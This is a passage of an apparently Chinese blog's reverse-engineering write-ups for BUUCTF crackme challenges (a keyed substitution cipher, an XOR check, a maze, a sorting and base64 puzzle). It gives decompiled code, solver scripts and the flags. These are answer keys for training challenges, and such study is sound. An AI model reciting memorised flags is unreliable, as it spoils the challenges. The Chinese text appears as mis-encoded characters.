class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">32</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 &lt;= <span class="number">96</span> || v1 &gt; <span class="number">122</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v1 &gt; <span class="number">64</span> &amp;&amp; v1 &lt;= <span class="number">90</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">          ++v3;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">        ++v3;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !(v3 % v5) )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(text, str2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v11;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸»è¦å°±æ˜¯é€†å‘è¿™ä¸€æ®µ, å¾—å‡ºv1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">32</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 &lt;= <span class="number">96</span> || v1 &gt; <span class="number">122</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v1 &gt; <span class="number">64</span> &amp;&amp; v1 &lt;= <span class="number">90</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">          ++v3;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">        ++v3;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !(v3 % v5) )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>å†™å‡ºè§£å¯†è„šæœ¬</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> key[<span class="number">16</span>] = <span class="string">&quot;adsfkndcls&quot;</span>;</span><br><span class="line">    <span class="type">char</span> ciphertext[<span class="number">16</span>] = <span class="string">&quot;killshadow&quot;</span>;</span><br><span class="line">    <span class="type">char</span> plaintext[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> key_offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(ciphertext); i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c = <span class="number">32</span>; c &lt; <span class="number">127</span>; c++) <span class="comment">//ç©·ä¸¾æ‰€æœ‰å¯æ‰“å°ASCIIå­—ç¬¦</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">char</span> temp = c;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="string">&#x27;a&#x27;</span> &lt;= c &amp;&amp; c &lt;= <span class="string">&#x27;z&#x27;</span>) <span class="built_in">or</span> (<span class="string">&#x27;A&#x27;</span> &lt;= c &amp;&amp; c &lt;= <span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">                temp = (c - <span class="number">39</span> - key[key_offset % <span class="built_in">strlen</span>(key)] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">            <span class="keyword">if</span> (temp == ciphertext[i])</span><br><span class="line">            &#123;</span><br><span class="line">                plaintext[i] = c;</span><br><span class="line">                key_offset++;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, plaintext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//KLDQCUDFZO</span></span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥<strong>flag</strong>å°±æ˜¯<code>flag&#123;KLDQCUDFZO&#125;</code></p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>äºŒè¿›åˆ¶</tag>
        <tag>é€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]xor</title>
    <url>/2022/01/21/%5BReverse%5Dxor/</url>
    <content><![CDATA[<p>ä¸‹è½½ä¸‹æ¥å‘ç°æ–‡ä»¶ä¸æ˜¯exe, å…ˆ<code>IDA</code>çœ‹ä¸€ä¸‹, å‘ç°ä¸æ˜¯PEæ–‡ä»¶</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201212026864.png"
alt="image-20220121202632787" />
<figcaption aria-hidden="true">image-20220121202632787</figcaption>
</figure>
<p>ç›´æ¥åˆ†æF5çœ‹ä¼ªä»£ç </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-124h]</span></span><br><span class="line">  <span class="type">char</span> __b[<span class="number">264</span>]; <span class="comment">// [rsp+40h] [rbp-110h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(__b, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your flag:\n&quot;</span>);</span><br><span class="line">  get_line(__b, <span class="number">256LL</span>);                 <span class="comment">//å°†è¾“å…¥çš„å­—ç¬¦ä¸²ä¿å­˜åˆ°__bæ•°ç»„ä¸­</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(__b) != <span class="number">33</span> )              <span class="comment">//è¾“å…¥çš„å­—ç¬¦ä¸²å¿…é¡»é•¿33å­—èŠ‚(ä¸å«å°¾éƒ¨&#x27;\0&#x27;)</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; <span class="number">33</span>; ++i )			</span><br><span class="line">    __b[i] ^= __b[i - <span class="number">1</span>];               <span class="comment">//è¾“å…¥å­—ç¬¦ä¸²çš„æ¯åä¸€ä½ä¸å‰ä¸€ä½çš„å¼‚æˆ–</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(__b, global, <span class="number">0x21</span>uLL) ) <span class="comment">//å°†å¼‚æˆ–åçš„ç»“æœä¸globalè¿™ä¸ªå­—ç¬¦ä¸²ç›¸æ¯”è¾ƒ</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">LABEL_7:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™è¿™é¢˜éœ€è¦ç”¨åˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹, å¼‚æˆ–(XOR)ä¸¤æ¬¡ä¼šè¿˜åŸ</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="number">101011</span> <span class="variable">XOR</span> <span class="number">111111</span> <span class="operator">=</span> <span class="number">010100</span>  <span class="operator">//</span>å°†<span class="number">101011</span>ä¸<span class="number">111111</span>å¼‚æˆ–</span><br><span class="line"><span class="number">010100</span> <span class="variable">XOR</span> <span class="number">111111</span> <span class="operator">=</span> <span class="number">101011</span>  <span class="operator">//</span>å°†å¼‚æˆ–æ‰€å¾—ç»“æœå†æ¬¡ä¸<span class="number">111111</span>å¼‚æˆ–å³å¯è¿˜åŸåŸæ–‡</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥åªéœ€è¦æŠŠ<code>global</code>æŒ‡å‘çš„å­—ç¬¦ä¸²æŒ‰ç…§é¢˜ç›®çš„æ–¹å¼å†æ¬¡è¿›è¡Œä¸€æ¬¡å¼‚æˆ–å³å¯å¾—åˆ°åŸæ–‡,
åŸæ–‡åº”è¯¥å°±æ˜¯<strong>flag</strong></p>
<p>å¯ä»¥åœ¨<code>IDA</code>é‡Œä½¿ç”¨<code>shift+e</code>æå–å­—ç¬¦æ•°ç»„</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201212053336.png"
alt="image-20220121205312277" />
<figcaption aria-hidden="true">image-20220121205312277</figcaption>
</figure>
<p>è§£å¯†ä»£ç å¦‚ä¸‹</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> ciphertext[] =</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="number">0x66</span>, <span class="number">0x0A</span>, <span class="number">0x6B</span>, <span class="number">0x0C</span>, <span class="number">0x77</span>, <span class="number">0x26</span>, <span class="number">0x4F</span>, <span class="number">0x2E</span>, <span class="number">0x40</span>, <span class="number">0x11</span>,</span><br><span class="line">	  <span class="number">0x78</span>, <span class="number">0x0D</span>, <span class="number">0x5A</span>, <span class="number">0x3B</span>, <span class="number">0x55</span>, <span class="number">0x11</span>, <span class="number">0x70</span>, <span class="number">0x19</span>, <span class="number">0x46</span>, <span class="number">0x1F</span>,</span><br><span class="line">	  <span class="number">0x76</span>, <span class="number">0x22</span>, <span class="number">0x4D</span>, <span class="number">0x23</span>, <span class="number">0x44</span>, <span class="number">0x0E</span>, <span class="number">0x67</span>, <span class="number">0x06</span>, <span class="number">0x68</span>, <span class="number">0x0F</span>,</span><br><span class="line">	  <span class="number">0x47</span>, <span class="number">0x32</span>, <span class="number">0x4F</span>, <span class="number">0x00</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">32</span>; i &gt;= <span class="number">1</span>; i--)</span><br><span class="line">		ciphertext[i] ^= ciphertext[i - <span class="number">1</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, ciphertext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;QianQiuWanDai_YiTongJiangHu&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>äºŒè¿›åˆ¶</tag>
        <tag>é€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]ä¸ä¸€æ ·çš„flag</title>
    <url>/2022/01/21/%5BReverse%5D%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84flag/</url>
    <content><![CDATA[<p>æ— å£³, ç›´æ¥æ‹–è¿›<code>IDA</code>åˆ†æ, F5æŸ¥çœ‹ä¼ªä»£ç </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">29</span>]; <span class="comment">// [esp+17h] [ebp-35h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+34h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+38h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-10h]</span></span><br><span class="line">  _BYTE v7[<span class="number">12</span>]; <span class="comment">// [esp+40h] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  __main();		<span class="comment">//æºç¨‹åºåº”è¯¥æ˜¯C++å†™çš„, __main()å‡½æ•°è°ƒç”¨äº†ä¸€ä¸ªæ„é€ å‡½æ•°, ä¸ç®¡</span></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;*11110100001010000101111#&quot;</span>);	<span class="comment">//å¥‡æ€ªçš„æ•°å­—</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you can choose one action to execute&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1 up&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2 down&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3 left&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4 right\n:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        --v4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 != <span class="number">4</span> )</span><br><span class="line">LABEL_13:</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      --*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(<span class="type">int</span> *)&amp;v3[<span class="number">4</span> * i + <span class="number">25</span>] &lt; <span class="number">0</span> || *(<span class="type">int</span> *)&amp;v3[<span class="number">4</span> * i + <span class="number">25</span>] &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="number">49</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="number">35</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nok, the order you enter is the flag!&quot;</span>); <span class="comment">//å¥½å®¶ä¼™, æˆ‘è¾“å…¥çš„å°±æ˜¯flag?çœŸå¤Ÿä¸ä¸€æ ·çš„</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åç¼–è¯‘å‡ºæ¥çš„ä¼ªä»£ç å¯è¯»æ€§æå·®, èŠ±äº†å¾ˆé•¿æ—¶é—´å†™å‡ºç­‰æ•ˆå½¢å¼çš„ä»£ç ,
å¦‚ä¸‹</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> char_arr[<span class="number">25</span>];</span><br><span class="line">	<span class="type">int</span> x_pos = <span class="number">0</span>;</span><br><span class="line">	<span class="type">int</span> y_pos = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">strncpy</span>(char_arr, <span class="string">&quot;*11110100001010000101111#&quot;</span>, <span class="number">25</span>);</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;you can choose one action to execute\n1 up\n2 down\n3 left\n4 right\n:&quot;</span>);</span><br><span class="line">		<span class="type">int</span> temp;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;temp);</span><br><span class="line">		<span class="keyword">switch</span> (temp)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			--x_pos;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			++x_pos;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			--y_pos;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			++y_pos;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (x_pos &lt; <span class="number">0</span> || x_pos &gt; <span class="number">4</span> || y_pos &lt; <span class="number">0</span> || y_pos &gt; <span class="number">4</span>)</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">if</span> (char_arr[<span class="number">5</span> * x_pos + y_pos] == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">if</span> (char_arr[<span class="number">5</span> * x_pos + y_pos] == <span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;\nok, the order you enter is the flag!&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·çœ‹ç»“æ„æ¸…æ™°å¾ˆå¤š,
å°±æ˜¯æŠŠ<code>*11110100001010000101111#</code>è¿™ä¸ªå­—ç¬¦ä¸²æ’æˆä¸€ä¸ª<code>5x5</code>çš„è¿·å®«</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    0  1  2  3  4</span><br><span class="line">   -------------â†’</span><br><span class="line">0 | *  1  1  1  1</span><br><span class="line">1 | 0  1  0  0  0</span><br><span class="line">2 | 0  1  0  1  0</span><br><span class="line">3 | 0  0  0  1  0</span><br><span class="line">4 â†“ 1  1  1  1  #</span><br><span class="line">æ¨ªä¸ºYè½´,ç«–ä¸ºXè½´, 0æ˜¯è·¯, 1æ˜¯å¢™,*æ˜¯èµ·ç‚¹, #æ˜¯ç»ˆç‚¹</span><br><span class="line">èµ°å‡ºè¿·å®«åªéœ€è¦&quot;ä¸‹ä¸‹ä¸‹å³å³ä¸Šä¸Šå³å³ä¸‹ä¸‹ä¸‹&quot;, å³&quot;222441144222&quot;</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥<strong>flag</strong>å°±æ˜¯<code>flag&#123;222441144222&#125;</code></p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>äºŒè¿›åˆ¶</tag>
        <tag>é€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]åˆ®å¼€æœ‰å¥–</title>
    <url>/2022/01/22/%5BReverse%5D%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/</url>
    <content><![CDATA[<p>æ— å£³, ç›´æ¥æ‹–è¿›<code>IDA</code>åˆ†æ, F5æŸ¥çœ‹ä¼ªä»£ç </p>
<p>ä¸»å‡½æ•°å¾ˆç®€æ´</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="type">int</span> nShowCmd)</span></span><br><span class="line">&#123;</span><br><span class="line">  DialogBoxParamA(hInstance, (LPCSTR)<span class="number">0x67</span>, <span class="number">0</span>, DialogFunc, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">//ç„æœºå°±åœ¨DialogFunc()å‡½æ•°ä¸­</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è·Ÿè¿›<code>DialogFunc()</code>å‡½æ•°, å‘ç°ä¸¤ä¸ªä½œç”¨ä¸æ˜çš„å‡½æ•°</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201230027196.png"
alt="image-20220123002708137" />
<figcaption aria-hidden="true">image-20220123002708137</figcaption>
</figure>
<p>æŠŠ<code>sub_4010F0</code>å‡½æ•°æŠ å‡ºæ¥æµ‹è¯•å‘ç°å®ƒä¼šä¿®æ”¹<code>v7[0]</code>ã€<code>v7[1]</code>ä»¥åŠ<code>v8~v16</code>çš„å€¼</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_4010F0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">	<span class="type">int</span> i; <span class="comment">// esi</span></span><br><span class="line">	<span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">	<span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">	result = a3;</span><br><span class="line">	<span class="keyword">for</span> (i = a2; i &lt;= a3; a2 = i)</span><br><span class="line">	&#123;</span><br><span class="line">		v5 = <span class="number">4</span> * i;</span><br><span class="line">		v6 = *(<span class="type">unsigned</span> <span class="type">long</span>*)(<span class="number">4</span> * i + a1);</span><br><span class="line">		<span class="keyword">if</span> (a2 &lt; result &amp;&amp; i &lt; result)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">do</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (v6 &gt; *(<span class="type">unsigned</span> <span class="type">long</span>*)(a1 + <span class="number">4</span> * result))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (i &gt;= result)</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					++i;</span><br><span class="line">					*(<span class="type">unsigned</span> <span class="type">long</span>*)(v5 + a1) = *(<span class="type">unsigned</span> <span class="type">long</span>*)(a1 + <span class="number">4</span> * result);</span><br><span class="line">					<span class="keyword">if</span> (i &gt;= result)</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					<span class="keyword">while</span> (*(<span class="type">unsigned</span> <span class="type">long</span>*)(a1 + <span class="number">4</span> * i) &lt;= v6)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">if</span> (++i &gt;= result)</span><br><span class="line">							<span class="keyword">goto</span> LABEL_13;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span> (i &gt;= result)</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">					v5 = <span class="number">4</span> * i;</span><br><span class="line">					*(<span class="type">unsigned</span> <span class="type">long</span>*)(a1 + <span class="number">4</span> * result) = *(<span class="type">unsigned</span> <span class="type">long</span>*)(<span class="number">4</span> * i + a1);</span><br><span class="line">				&#125;</span><br><span class="line">				--result;</span><br><span class="line">			&#125; <span class="keyword">while</span> (i &lt; result);</span><br><span class="line">		&#125;</span><br><span class="line">	LABEL_13:</span><br><span class="line">		*(<span class="type">unsigned</span> <span class="type">long</span>*)(a1 + <span class="number">4</span> * result) = v6;</span><br><span class="line">		sub_4010F0(a1, a2, i - <span class="number">1</span>);</span><br><span class="line">		result = a3;</span><br><span class="line">		++i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> arr[<span class="number">11</span>] = &#123; <span class="number">90</span>,<span class="number">74</span>,<span class="number">83</span>,<span class="number">69</span>,<span class="number">67</span>,<span class="number">97</span>,<span class="number">78</span>,<span class="number">72</span>,<span class="number">51</span>,<span class="number">110</span>,<span class="number">103</span> &#125;;</span><br><span class="line">	sub_4010F0((<span class="type">int</span>)arr, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">11</span>; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//51 67 69 72 74 78 83 90 97 103 110</span></span><br><span class="line"><span class="comment">//å½“ä½œASCIIå­—ç¬¦å°±æ˜¯&quot;3CEHJNSZagn&quot;</span></span><br><span class="line"><span class="comment">//æ¯ä¸€ä½åˆ†åˆ«å¯¹åº”v7[0]ã€v7[1]ä»¥åŠv8~v16çš„å€¼</span></span><br><span class="line"><span class="comment">//æ˜¾ç„¶sub_4010F0()çš„ä½œç”¨æ˜¯å‡åºæ’åº</span></span><br></pre></td></tr></table></figure>
<p><code>sub_401000()</code>å‡½æ•°, å¯ä»¥æ ¹æ®å…¶ä¸­ç”¨åˆ°çš„ç è¡¨æ¨æµ‹,
æ˜¯base64ç¼–ç å‡½æ•°</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201230024243.png"
alt="image-20220123002448205" />
<figcaption aria-hidden="true">image-20220123002448205</figcaption>
</figure>
<figure>
<img
